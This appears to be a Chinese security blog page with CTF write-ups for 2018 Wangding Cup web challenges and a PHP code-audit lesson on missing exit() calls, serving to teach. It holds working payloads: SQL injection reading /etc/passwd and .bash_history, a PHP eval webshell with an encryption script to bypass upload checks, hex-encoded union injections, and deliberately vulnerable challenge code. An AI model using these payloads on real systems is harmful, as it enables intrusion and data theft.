<p>看到是 <strong>root</strong> 用户，一般 <strong>flag</strong> 就不会在数据库里面(因为如果在数据库中，不需要这么高的权限，实际也确实没有)，应该是要用 <strong>SQL语句</strong> 读取flag文件了。</p>
<p>首先读取 <strong>/etc/passwd</strong> 看看服务器上有哪些用户，payload为: <strong>‘,content=(select load_file(‘/etc/passwd’)),/*</strong> </p>
<p><img src="/img/2018网鼎杯第四场/8.png" alt="8"></p>
<p>发现存在 <strong>www</strong> 用户，继续查看 <strong>.bash_history</strong> 记录，payload为: <strong>‘,content=(select load_file(‘/home/www/.bash_history’)),/*</strong> </p>
<p><img src="/img/2018网鼎杯第四场/9.png" alt="9"></p>
<p>发现 <strong>www</strong> 用户的一些操作。看见有 <strong>.DS_Store</strong> 文件，考虑到目标环境是docker，所以 <strong>.DS_Store</strong> 文件应该在 <strong>/tmp</strong> 中。而 <strong>.DS_Store</strong> 文件中，经常会有一些不可键字符，所以我们可以使用hex函数对其内容进行转换，payload为： <strong>‘,content=(select hex(load_file(‘/tmp/html/.DS_Store’))),/*</strong> </p>
<p><img src="/img/2018网鼎杯第四场/10.png" alt="10"></p>
<p>解码获得flag路径：</p>
<p><img src="/img/2018网鼎杯第四场/11.png" alt="11"></p>
<p>使用payload： <strong>‘,content=(select load_file(‘/var/www/html/flag_8946e1ff1ee3e40f.php’)),/*</strong> 读取flag：</p>
<p><img src="/img/2018网鼎杯第四场/12.png" alt="12"></p>
<h3 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h3><p>没啥意思的一道题目。题目是一个wordpress的站点，如下：</p>
<p><img src="/img/2018网鼎杯第四场/13.png" alt="13"></p>
<p>查看图片的url，发现其url形式极其可能存在SSRF漏洞：</p>
<p><img src="/img/2018网鼎杯第四场/14.png" alt="14"></p>
<p>通过 <strong>git</strong> 收集信息，可以发现一个内网用户查询接口。</p>
<p><img src="/img/2018网鼎杯第四场/15.png" alt="15"></p>
<p><img src="/img/2018网鼎杯第四场/16.png" alt="16"></p>
<p><strong>api.php</strong> 的内容为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//http://10.220.56.29/WD_UserListAPI.php?uid=</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>所以我们遍历uid的值即可获取用户信息。当uid值为233的时候，即可获得flag：</p>
<p><img src="/img/2018网鼎杯第四场/17.png" alt="17"></p>
<h3 id="NoWafUpload"><a href="#NoWafUpload" class="headerlink" title="NoWafUpload"></a>NoWafUpload</h3><p>这题可以任意上传文件，题目如下：</p>
<p><img src="/img/2018网鼎杯第四场/18.png" alt="18"></p>
<p>当我们上传PHP一句话的时候，显示上传成功并返回路径，但是去访问就404。</p>
<p><img src="/img/2018网鼎杯第四场/19.png" alt="19"></p>
<p>一开始以为是时间竞争，尝试发现并不是。扫了一下目录，发现存在 <strong><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></strong> 文件，里面包含一个.so的拓展还有一个经过加密的PHP文件。所以考点应该是我们通过逆向来知道加密算法，然后将我们的一句话经过该加密算法加密后再上传，这样代码通过检测才能被解析。使用 <strong>IDA</strong> 反汇编 <strong>funencrypt.so</strong> 文件，发现关键函数，代码如下：</p>
<p><img src="/img/2018网鼎杯第四场/21.png" alt="21"></p>
<p>我们把经过加密的 <strong>sdfasgerwtytc.php</strong> 文件拖入16进制分析软件中，并根据上面的反汇编代码进行对比：</p>
<p><img src="/img/2018网鼎杯第四场/22.png" alt="22"></p>
<p> <strong>sdfasgerwtytc.php</strong> 文件实际上就是一个 <strong>phpinfo</strong> 页面（上传上去访问就知道了），而上图中的的三个 <strong>fread</strong> 代码分别表示前32字节的字符串（这里刚好是一个md5值）、两个长度。一个为16进制 <strong>10</strong> ，即整数16，猜测是代码： <strong>&lt;?php phpinfo();</strong> 的长度，后面一个为16进制16，即整数22，刚好是后面一段乱七八糟字符串的长度。</p>
<p>我们继续看35行以下的代码。首先先校验了开头读的md5，而这个md5的值就是后面那一串乱七八糟字符串的md5，这个自己计算一下就知道了。然后取那串乱七八糟的字符串逐位与 <strong>0xC</strong> 进行异或，并将其结果 <strong>uncompress</strong> 后写入某个文件。</p>
<p><img src="/img/2018网鼎杯第四场/23.png" alt="23"></p>
<p>根据上面的逻辑，反推回去，写出加密PHP程序的代码。如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib,zlib</span><br><span class="line">s = <span class="string">"&lt;?php eval($_POST[_]);"</span></span><br><span class="line">bf_len = hex(len(s))</span><br><span class="line"></span><br><span class="line">compress_s = zlib.compress(s)</span><br><span class="line"></span><br><span class="line">new_compress = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> compress_s:</span><br><span class="line">    new_compress += chr(ord(ch)^<span class="number">0xC</span>)</span><br><span class="line"></span><br><span class="line">MD5 = hashlib.md5()</span><br><span class="line">MD5.update(new_compress)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"MD5 : "</span> + MD5.hexdigest().encode(<span class="string">'hex'</span>))</span><br><span class="line">print(<span class="string">"bf_len: "</span> + bf_len)</span><br><span class="line">af_len = hex(len(new_compress))</span><br><span class="line">print(<span class="string">"af_len: "</span> + af_len)</span><br><span class="line">print(<span class="string">"new_compress: "</span> + new_compress.encode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure>
<p>将生成的16进制数据按顺序写入文件即可：</p>
<p><img src="/img/2018网鼎杯第四场/24.png" alt="24"></p>
<p>上传该文件，使用密码 <strong>_</strong> 查找flag：</p>
<p><img src="/img/2018网鼎杯第四场/25.png" alt="25"></p>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/08/31/代码审计Day10 - 程序未恰当exit导致的问题/">代码审计Day10 - 程序未恰当exit导致的问题</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-08-31
        </span>
        
          <div class="post-category">
            
              <a href="/categories/代码审计/">代码审计</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大家好，我们是红日安全-代码审计小组。最近我们小组正在做一个PHP代码审计的项目，供大家学习交流，我们给这个项目起了一个名字叫 <a href="https://github.com/hongriSec/PHP-Audit-Labs" target="_blank" rel="noopener"><strong>PHP-Audit-Labs</strong></a> 。现在大家所看到的系列文章，属于项目 <strong>第一阶段</strong> 的内容，本阶段的内容题目均来自 <a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">PHP SECURITY CALENDAR 2017</a> 。对于每一道题目，我们均给出对应的分析，并结合实际CMS进行解说。在文章的最后，我们还会留一道CTF题目，供大家练习，希望大家喜欢。下面是 <strong>第10篇</strong> 代码审计文章：</p>
<h2 id="Day-10-Anticipation"><a href="#Day-10-Anticipation" class="headerlink" title="Day 10 - Anticipation"></a>Day 10 - Anticipation</h2><p>题目叫做预期，代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/1.png" alt="1"></p>
<p><strong>漏洞解析</strong> ：</p>
<p>这道题目实际上讲的是当检测到攻击时，虽然有相应的防御操作，但是程序未立即停止退出，导致程序继续执行的问题。程序在 <strong>第一行处</strong> 使用 <strong>extract</strong> 函数，将 <strong>POST</strong> 请求的数据全都注册成变量， <strong>extract</strong> 函数的定义如下：</p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.extract.php" target="_blank" rel="noopener"> extract </a> ：(PHP 4, PHP 5, PHP 7)</p>
<p><strong>功能</strong> ：从数组中将变量导入到当前的符号表</p>
<p><strong>定义</strong> ： <code>int extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] )</code> </p>
</blockquote>
<p>该函数实际上就是把数组中的键值对注册成变量，具体可以看如下案例：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/2.png" alt="2"></p>
<p>这样我们就可以控制 <strong>第7行</strong> 处的 <strong>pi</strong>  变量。程序对 <strong>pi</strong>  变量进行简单的验证，如果不是数字或者没有设置 <strong>pi</strong>  变量，程序就会执行 <strong>goAway</strong> 方法，即记录错误信息并直接重定向到 <strong>/error/</strong> 页面。看来程序员这里是对非法的操作进行了一定的处理。但是关键在于，程序在处理完之后，没有立即退出，这样程序又会按照流程执行下去，也就到了 <strong>第11行</strong> 的 <strong>assert</strong> 语句。由于前面 <strong>pi</strong>  变量可以被用户控制，所以在这一行存在远程代码执行漏洞。</p>
<p>例如我们的payload为：<strong>pi=phpinfo()</strong> （这里为POST传递数据），然后程序就会执行这个 <strong>phpinfo</strong> 函数。当然，你在浏览器端可能看不到 <strong>phpinfo</strong> 的页面，而是像下面这样的图片：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/3.png" alt="3"></p>
<p>但是用 <strong>BurpSuite</strong> ，大家就可以清晰的看到程序执行了 <strong>phpinfo</strong> 函数：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/4.png" alt="4"></p>
<p>为了方便大家理解，笔者这里录制了debug程序的过程：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/5.gif" alt="5"></p>
<p>实际上，这种案例在真实环境下还不少。例如有些CMS通过检查是否存在install.lock文件，从而判断程序是否安装过。如果安装过，就直接将用户重定向到网站首页，却忘记直接退出程序，导致网站重装漏洞的发生。下面我们来看两个真实的案例。</p>
<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="FengCms-1-32-网站重装漏洞"><a href="#FengCms-1-32-网站重装漏洞" class="headerlink" title="FengCms 1.32 网站重装漏洞"></a>FengCms 1.32 网站重装漏洞</h3><p>本次实例分析，我们选取的是 <strong><a href="http://pan.baidu.com/s/1i33gNVR" target="_blank" rel="noopener">FengCms 1.32</a></strong> 。对于一个已经安装好的 <strong>FengCms</strong> ，当用户再次访问 <strong>install/index.php</strong> 时，就会导致网站重装。我们来具体看下程序的逻辑：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/6.png" alt="6"></p>
<p>我们可以看到，如果是第一次安装网站，程序会在 <strong>upload</strong> 目录下生成一个 <strong>INSTALL</strong> 文件，用于表示该网站已经安装过(对应上图 <strong>25-28行</strong> 代码)。当我们再次访问该文件时，程序会先判断 <strong>upload</strong> 目录下是否有 <strong>INSTALL</strong> 文件。如果存在，则弹窗提示你先删除 <strong>INSTALL</strong> 文件才能进行网站重装(对应上图 <strong>1-4行</strong> 代码)。但是这里注意了，网站在弹出告警信息后，并没有退出，而是继续执行，所以我们在不删除 <strong>INSTALL</strong> 文件的情况下，仍可以重装网站。</p>
<p>比较有趣的是，原本网站网站成功后，程序会自动删除 <strong>upload</strong> 目录下的所有文件，来防止攻击者重装网站，然而这段代码却在注释当中，具体原因不得而知。</p>
<p><img src="/img/PHP-Audit-Labs/Day10/7.png" alt="7"></p>
<h3 id="Simple-Log1-6网站重装漏洞"><a href="#Simple-Log1-6网站重装漏洞" class="headerlink" title="Simple-Log1.6网站重装漏洞"></a>Simple-Log1.6网站重装漏洞</h3><p>我们再来看 <strong><a href="http://down.admin5.com/php/42012.html#link" target="_blank" rel="noopener">Simple-Log1.6</a></strong> 网站重装的例子。其 <strong>install\index.php</strong> 文件中，对网站安装成功的处理有问题，其代码是在下图 <strong>17-20行</strong> ，程序只是用 <strong>header</strong> 函数将其重定向到网站首页，然而程序还是会继续执行下去。</p>
<p><img src="/img/PHP-Audit-Labs/Day10/8.png" alt="8"></p>
<p>而且程序的安装逻辑其实是有问题的，安装步骤由 <strong>$setup</strong> 变量控制，而 <strong>$setup</strong> 变量可以被用户完全控制(如上图 <strong>第10行</strong> 代码)，攻击者完全可以控制网站的安装步骤。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞利用就极其简单了，我们先来看一下 <strong>FengCms</strong> ，我们直接访问 <strong>install/index.php</strong> 页面，无视弹出来的警告：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/9.png" alt="9"></p>
<p><img src="/img/PHP-Audit-Labs/Day10/10.png" alt="10"></p>
<p>可以看到程序仍然可以继续安装。</p>
<p>我们再来看一下 <strong>Simple-Log</strong> 的重装利用：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/11.png" alt="11"></p>
<p>直接post以上数据，即可重装网站数据。</p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>实际上，要修复这一类型的漏洞，我们只要在正确的地方退出程序即可。拿这次的例题举例，我们只需要在检查到非法操作的时候，直接添加退出函数，即可避免漏洞发生。例如使用 <strong>die</strong> 、 <strong>exit</strong> 等函数都是可以的，具体修复代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/12.png" alt="12"></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>看完了上述分析，不知道大家是否对 <strong>未正确退出程序</strong> 导致的攻击有了更加深入的理解，文中用到的 <strong>CMS</strong> 可以从这里( <a href="http://pan.baidu.com/s/1i33gNVR" target="_blank" rel="noopener"><strong>FengCms 1.32</strong></a>  、 <strong><a href="http://down.admin5.com/php/42012.html#link" target="_blank" rel="noopener">Simple-Log1.6</a></strong> )下载，当然文中若有不当之处，还望各位斧正。如果你对我们的项目感兴趣，欢迎发送邮件到 <a href="mailto:**hongrisec@gmail.com" target="_blank" rel="noopener">**hongrisec@gmail.com</a><strong> 联系我们。</strong>Day10** 的分析文章就到这里，我们最后留了一道CTF题目给大家练手，题目如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stophack</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_array($string))&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            $string[$key] = stophack($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $raw = $string;</span><br><span class="line">        $replace = <span class="keyword">array</span>(<span class="string">"\\"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"/"</span>,<span class="string">"*"</span>,<span class="string">"%5C"</span>,<span class="string">"%22"</span>,<span class="string">"%27"</span>,<span class="string">"%2A"</span>,<span class="string">"~"</span>,<span class="string">"insert"</span>,<span class="string">"update"</span>,<span class="string">"delete"</span>,<span class="string">"into"</span>,<span class="string">"load_file"</span>,<span class="string">"outfile"</span>,<span class="string">"sleep"</span>,);</span><br><span class="line">        $string = str_ireplace($replace, <span class="string">"HongRi"</span>, $string);</span><br><span class="line">        $string = strip_tags($string);</span><br><span class="line">        <span class="keyword">if</span>($raw!=$string)&#123;</span><br><span class="line">            error_log(<span class="string">"Hacking attempt."</span>);</span><br><span class="line">            header(<span class="string">'Location: /error/'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> trim($string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) &amp;&amp; $_GET[<span class="string">'id'</span>])&#123;</span><br><span class="line">    $id = stophack($_GET[<span class="string">'id'</span>]);</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM students WHERE id=$id"</span>;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        $row = $result-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;h1&gt;查询结果为：&lt;/h1&gt;&lt;pre&gt;'</span>.<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        | id | name    | email              | score |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        |  <span class="subst">&#123;$row['id']&#125;</span> | <span class="subst">&#123;$row['name']&#125;</span>   | <span class="subst">&#123;$row['email']&#125;</span>   |   <span class="subst">&#123;$row['score']&#125;</span> |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+&lt;/center&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">"你所查询的对象id值不能为空！"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"fire"</span>;</span><br><span class="line">$password = <span class="string">"fire"</span>;</span><br><span class="line">$dbname = <span class="string">"day10"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 搭建CTF环境使用的sql语句</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> day10;</span><br><span class="line"><span class="keyword">use</span> day10;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> students (</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">6</span>) <span class="keyword">unsigned</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">email <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">score <span class="built_in">int</span>(<span class="number">8</span>) <span class="keyword">unsigned</span> <span class="keyword">not</span> <span class="literal">null</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> students <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">'Lucia'</span>,<span class="string">'Lucia@hongri.com'</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> students <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">'Danny'</span>,<span class="string">'Danny@hongri.com'</span>,<span class="number">59</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> students <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">'Alina'</span>,<span class="string">'Alina@hongri.com'</span>,<span class="number">66</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> students <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">'Jameson'</span>,<span class="string">'Jameson@hongri.com'</span>,<span class="number">13</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> students <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">'Allie'</span>,<span class="string">'Allie@hongri.com'</span>,<span class="number">88</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> flag(flag <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> flag <span class="keyword">VALUES</span>(<span class="string">'HRCTF&#123;tim3_blind_Sql&#125;'</span>);</span><br></pre></td></tr></table></figure>
<p>题解我们会阶段性放出，如果大家有什么好的解法，可以在文章底下留言，祝大家玩的愉快！</p>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/08/29/2018网鼎杯第三场Web题解/">2018网鼎杯第三场Web题解</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-08-29
        </span>
        
          <div class="post-category">
            
              <a href="/categories/CTF竞赛训练/">CTF竞赛训练</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="comein"><a href="#comein" class="headerlink" title="comein"></a>comein</h3><p>题目：由于运维人员失误，内网认证页面部署至了外网，不过还好，开发加了域名验证。</p>
<p><img src="/img/2018网鼎杯第三场/1.png" alt="1"></p>
<p>查看源码，发现如下代码：</p>
<p><img src="/img/2018网鼎杯第三场/2.png" alt="2"></p>
<p>很明显又是考察 <strong>parse_url</strong> 函数绕过，只不过开头多了对点号的匹配，绕过即可。使用 <strong>payload</strong> ：<a href="mailto:`.@c7f.zhuque.com" target="_blank" rel="noopener">`.@c7f.zhuque.com</a>/..//`</p>
<p><img src="/img/2018网鼎杯第三场/3.png" alt="3"></p>
<p>可以自己本地调试一下。</p>
<p><img src="/img/2018网鼎杯第三场/4.png" alt="4"></p>
<h3 id="gold"><a href="#gold" class="headerlink" title="gold"></a>gold</h3><p>题目：还在上小学的小明同学开发了一款游戏，你能通关吗？</p>
<p><img src="/img/2018网鼎杯第三场/5.gif" alt="5"></p>
<p><strong>Burpsuite</strong> 抓包会发现浏览器一直发送POST数据，应该是通过Ajax来发起请求的：</p>
<p><img src="/img/2018网鼎杯第三场/6.png" alt="6"></p>
<p>根据题目提示： <strong>收集1000金币即可过关</strong> 。尝试直接将参数 <strong>getGod</strong> 的值修改为1000，发现会触发检测机制。</p>
<p><img src="/img/2018网鼎杯第三场/7.png" alt="7"></p>
<p>于是使用 <strong>Burpsuite</strong> 抓包，用 <strong>Intruder</strong> 模块从0跑到1001，在 <strong>getGod=1001</strong> 的数据包中获得flag：</p>
<p><img src="/img/2018网鼎杯第三场/8.png" alt="8"></p>
<p>PS：用多线程跑会触发游戏的反作弊机制，用单线程按顺序跑就能出flag。</p>
<h3 id="phone"><a href="#phone" class="headerlink" title="phone"></a>phone</h3><p>题目：find the flag.</p>
<p><img src="/img/2018网鼎杯第三场/9.png" alt="9"></p>
<p>看到这道题目，马上就想到 <a href="https://mochazz.github.io/2017/09/11/QWBCTF/"> 2017广东省强网杯(第三题)</a> 。测试了一下，果然在用户注册处的电话处存在二次注入，测试结果如下：</p>
<p><img src="/img/2018网鼎杯第三场/10.png" alt="10"></p>
<p><img src="/img/2018网鼎杯第三场/11.png" alt="11"></p>
<p>可以发现这里查询结果为： <strong>有1人和你电话相似哦~</strong> ，而时间上这是我注册的第一个用户，数据库中不可能有用户的电话和我一样，所以应该是执行了我们刚刚构造的 <strong>SQL语句</strong> ，因为后面的布尔逻辑值为真。所以我们分别构造获取表名、列名、字段的 <strong>payload</strong> 如下：</p>
<p>获取表名：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa' union <span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span> <span class="keyword">desc</span>#</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=test4&amp;password=test4&amp;phone=0x6161612720756e696f6e2073656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829206f726465722062792031206465736323&amp;register=Login</span><br></pre></td></tr></table></figure>
<p><img src="/img/2018网鼎杯第三场/12.png" alt="12"></p>
<p>获取列名：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa' union <span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"flag"</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span> <span class="keyword">desc</span>#</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=test6&amp;password=test6&amp;phone=0x6161612720756e696f6e2073656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d22666c616722206f726465722062792031206465736323&amp;register=Login</span><br></pre></td></tr></table></figure>
<p><img src="/img/2018网鼎杯第三场/13.png" alt="13"></p>
<p>获取字段：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa' union <span class="keyword">select</span> f14g <span class="keyword">from</span> flag <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span> <span class="keyword">desc</span>#</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=test7&amp;password=test7&amp;phone=0x6161612720756e696f6e2073656c65637420663134672066726f6d20666c6167206f726465722062792031206465736323&amp;register=Login</span><br></pre></td></tr></table></figure>
<p><img src="/img/2018网鼎杯第三场/14.png" alt="14"></p>
<p>这里可能有人会不明白为什么要加上 <strong>order by 1 desc</strong> ，大家可以试试下面这个 <strong>payload</strong> ：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa' union <span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()#</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=test8&amp;password=test8&amp;phone=0x6161612720756e696f6e2073656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d6461746162617365282923&amp;register=Login</span><br></pre></td></tr></table></figure>
<p><img src="/img/2018网鼎杯第三场/15.png" alt="15"></p>
<p>实际上后台的 <strong>SQL语句</strong> 类似下图 <strong>第一个SQL语句</strong> ：</p>
<p><img src="/img/2018网鼎杯第三场/16.png" alt="16"></p>
<h3 id="i-am-admin"><a href="#i-am-admin" class="headerlink" title="i_am_admin"></a>i_am_admin</h3><p>题目：你能登录进去吗？</p>
<p><img src="/img/2018网鼎杯第三场/17.png" alt="17"></p>
<p>抓取登录数据包，发现 <strong>JWT</strong> ：</p>
<p><img src="/img/2018网鼎杯第三场/18.png" alt="18"></p>
<p>登录进去可以发现用于加密的 <strong>secret key</strong> ：</p>
<p><img src="/img/2018网鼎杯第三场/19.png" alt="19"></p>
<p>使用这个 <strong>secret key</strong> 到 <a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a> 生成 <strong>admin</strong> 对应的 <strong>token</strong> 值：</p>
<p><img src="/img/2018网鼎杯第三场/20.png" alt="20"></p>
<p>使用该 <strong>token</strong> 值访问网站即可获得flag：</p>
